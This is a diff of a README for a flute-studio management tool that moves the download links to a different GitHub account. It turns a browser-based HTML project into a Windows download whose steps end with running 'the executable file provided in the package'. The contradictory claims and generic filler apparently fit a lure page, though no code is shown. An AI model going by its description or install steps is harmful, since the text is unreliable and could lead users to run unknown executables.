@@ -1,151 +1,77 @@
-# Bamboo Flute Studio - Studio Management Workspace 2026
+# 🎋 bamboo-flute-studio-hub - Manage your flute studio with ease
 
-> **Bamboo Flute Studio is an HTML web workspace that combines eight management modules for structured bamboo flute studio administration.**
+[![](https://img.shields.io/badge/Download-Bamboo_Flute_Studio-blue.svg)](https://github.com/rudratalegaonkar1-art/bamboo-flute-studio-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/sam-youngao134/bamboo-flute-studio-hub?style=flat-square)](https://github.com/sam-youngao134/bamboo-flute-studio-hub)
+Bamboo Flute Studio provides a digital workspace for music teachers. This tool organizes your studio tasks into eight modules. You gain control over student records, lesson plans, and scheduling. It creates a structured environment for your 2026 teaching goals.
 
----
+## 🛠️ What this tool does
 
-<p align="center">
-  <a href="https://sam-youngao134.github.io/bamboo-flute-studio-hub/">
-    <img src="https://img.shields.io/badge/Download-Bamboo%20Flute%20Studio%20Latest-brightgreen?style=for-the-badge" alt="Download Bamboo Flute Studio">
-  </a>
-</p>
+Music teachers often struggle with scattered paperwork. This hub gathers your administration needs into one location. You track progress, manage payments, and save lesson notes. The software keeps your records accurate and saves time each week. 
 
-> **[Download Bamboo Flute Studio Latest](https://sam-youngao134.github.io/bamboo-flute-studio-hub/)**
+The software includes these core modules:
+- Student database: Keep contact details and history for every pupil.
+- Lesson scheduler: View your calendar for the month ahead.
+- Progress tracker: Log flute techniques and songs learned.
+- Finance module: Monitor payments and studio income.
+- Attendance log: Mark student presence for each session.
+- Resource library: Access sheet music and study materials.
+- Communication log: Review past emails and text updates.
+- Goal setting: Outline milestones for the upcoming season.
 
----
+## 🖥️ System Requirements
 
-[Download Latest Build](https://sam-youngao134.github.io/bamboo-flute-studio-hub/)
+Your computer needs specific settings to run this software. Check these items before you begin:
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 GB of RAM.
+- Storage: 200 MB of free disk space.
+- Browser: Microsoft Edge, Google Chrome, or Mozilla Firefox.
+- Internet: Connection for initial setup.
 
----
+## 📥 How to download and install
 
-## Overview
+Follow these steps to set up the hub on your Windows computer.
 
-Bamboo Flute Studio provides a browser-accessible workspace for coordinating bamboo flute studio activities. Rather than spreading routine administration across separate pages, it places eight management modules behind a shared dashboard.
+1. Visit this page to download the software: [https://github.com/rudratalegaonkar1-art/bamboo-flute-studio-hub](https://github.com/rudratalegaonkar1-art/bamboo-flute-studio-hub)
+2. Locate the button labeled "Code" on the main repository page.
+3. Select "Download ZIP" from the menu.
+4. Open your Downloads folder once the file finishes saving.
+5. Right-click the zipped folder and choose "Extract All".
+6. Pick a destination folder on your computer for the extracted files.
+7. Open the folder you just created.
+8. Locate the file named "index.html" or the executable file provided in the package.
+9. Double-click the file to open the studio dashboard in your default web browser.
 
-The project is aimed at individuals who need a focused personal operations environment for their studio. Because it is built as an HTML web project, it can be opened in a modern browser and used as a dedicated studio administration interface.
+## 🚀 Setting up your studio
 
----
+Once you launch the application, you see a clean dashboard. Follow these steps to configure your workspace for the first time.
 
-## What It Includes
+### Create your profile
+The software asks for basic studio information upon first use. Enter your name and the studio address. This data appears on reports and student receipts.
 
-- Eight purpose-specific modules for managing studio operations.
-- A central dashboard that serves as the workspace starting point.
-- A unified layout for regular studio administration tasks.
-- A personal workspace intended for individual operators.
-- Organization and terminology centered on bamboo flute studios.
-- Browser-based operation without a separate desktop application.
-- An HTML implementation that can be hosted through standard web hosting.
-- A single project that keeps related studio workflows together.
+### Add your students
+Click the "Students" tab on the left menu. Select "Add New." Fill in the name, phone number, and email address. You may also add notes about their current skill level.
 
----
+### Schedule lessons
+Navigate to the "Calendar" tab. Click on a time slot to create an event. Choose the student from your list and select the lesson duration. The hub saves these changes automatically.
 
-## Getting Started
+### Track student progress
+Open a student profile and click "Lessons." Add a new entry after each session. Note the techniques covered, such as breathing, tonguing, or specific raga scales.
 
-### Download
+## 🔧 Troubleshooting
 
-1. Visit the [latest build](https://sam-youngao134.github.io/bamboo-flute-studio-hub/).
-2. Download or copy the project files into a local directory if you want to run a local copy.
-3. Open the primary HTML file with a modern web browser.
+If you experience issues, review these common fixes.
 
-### Clone with Git
+- The application does not open: Ensure your web browser is up to date. Try opening the "index.html" file with a different browser if the current one displays a blank screen.
+- Changes do not save: Check that you have write permissions for the folder where you saved the files. Move the folder to your Documents directory if issues persist.
+- Font or layout looks strange: Zoom out in your browser by pressing the Control key and the minus key at the same time. This resets the display scale.
+- File missing error: Re-download the ZIP file from the link provided above to ensure no files were corrupted during the initial transfer.
 
-```bash
-git clone https://github.com/sam-youngao134/bamboo-flute-studio-hub.git
-cd REPO
-```
+## 📋 Maintaining your records
 
-After cloning, open the main HTML page directly. If browser file-access rules prevent it from working correctly, serve the project directory with a local web server.
+Back up your data often. Copy the entire folder to a cloud storage service or an external hard drive every month. This practice protects your studio records from computer failures. Keep your student notes specific and concise. Use the search bar in the "Students" module to find specific records quickly.
 
----
+## 🔒 Security and Privacy
 
-## Using the Workspace
+Your data stays on your computer. The hub does not send your student records to any external servers. You maintain total control over your information. Keep your computer password-protected to ensure student privacy. Avoid sharing your main computer account with other users.
 
-1. Load Bamboo Flute Studio in your browser.
-2. Begin from the dashboard.
-3. Choose the module associated with the task you need to handle.
-4. Complete the work within that module as part of your studio routine.
-5. Use the dashboard to switch among the eight available workspace areas.
-
-To publish a hosted version, place the HTML project on a compatible web host and visit the resulting public URL.
-
----
-
-## Project Configuration
-
-Bamboo Flute Studio is an HTML-based workspace, so its configuration is defined by the project files and by any settings exposed inside the individual modules.
-
-When working with a local copy:
-
-1. Preserve the existing directory layout.
-2. Inspect the HTML files before applying custom edits.
-3. Adjust displayed content or available module settings as needed.
-4. Refresh the browser after saving changes.
-
-For hosted installations, replace the hosted files when applying a newer build or publishing your local updates.
-
----
-
-## Requirements
-
-- A current web browser.
-- Web access when using the hosted build.
-- Local file access or a static web server for local or offline operation.
-- Enough storage for the downloaded HTML project files.
-- No server-side runtime is specified; the project is identified as HTML-based.
-
----
-
-## Frequently Asked Questions
-
-### Who can use Bamboo Flute Studio?
-
-The workspace is intended for individuals who organize and manage bamboo flute studio operations from one personal environment.
-
-### How many modules does it provide?
-
-There are eight management modules in the workspace.
-
-### Is a desktop installation required?
-
-No. Bamboo Flute Studio targets the web platform and can be opened directly in a browser.
-
-### What is the update process?
-
-Open the [latest build](https://sam-youngao134.github.io/bamboo-flute-studio-hub/) or retrieve the newest repository contents with Git.
-
-```bash
-git pull
-```
-
-### How is configuration maintained?
-
-The project files contain the settings and visible configuration, along with any controls supplied by the applicable modules.
-
-### What should I do if the page fails to load properly?
-
-Check that all project files were downloaded, open the main HTML file, and use a browser with standard HTML support. When local file restrictions cause problems, run the directory through a local web server instead.
-
-### Can the project be deployed to static hosting?
-
-Yes. Since the project is HTML-based, it can be published to a compatible static web host. Before deploying, verify the project structure and retain the existing relative file paths.
-
----
-
-## Planned Improvements
-
-- Polish the dashboard interface.
-- Further structure the eight management modules.
-- Strengthen the personal studio operations workflow.
-- Add more documentation covering individual module usage.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: bamboo flute, studio management, music teacher, organization, windows application, flute lessons, administration, student tracker
